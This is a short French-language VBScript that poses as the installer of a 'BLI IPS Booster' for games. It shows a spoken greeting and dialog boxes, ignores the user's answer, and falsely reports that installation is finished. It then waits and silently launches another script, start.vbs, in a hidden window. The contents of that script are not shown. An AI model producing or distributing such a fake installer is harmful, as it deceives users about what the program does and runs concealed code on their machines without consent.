CreateObject("SAPI.SpVoice").Speak"Procerssus d'installation est entrain de s'ouvrir"

WScript.Sleep 300

X = MsgBox ("Bienvenue dans l'installateur du BLI IPS Booster pour tous les jeux. Souhaitez-vous l'installer ?", 4 +0, "BLI IPS Booster")

WScript.Sleep 10000

X = MsgBox ("Installation fini, vous pouvez maintenant jouer sans aucunes pertes d'IPS !", 0 +0, "BLI IPS Booster")

WScript.Sleep 50000

Set oWShell = CreateObject("Wscript.Shell") 

oWShell.Run """start.vbs""", 0, False 

Set oWSHell = Nothing
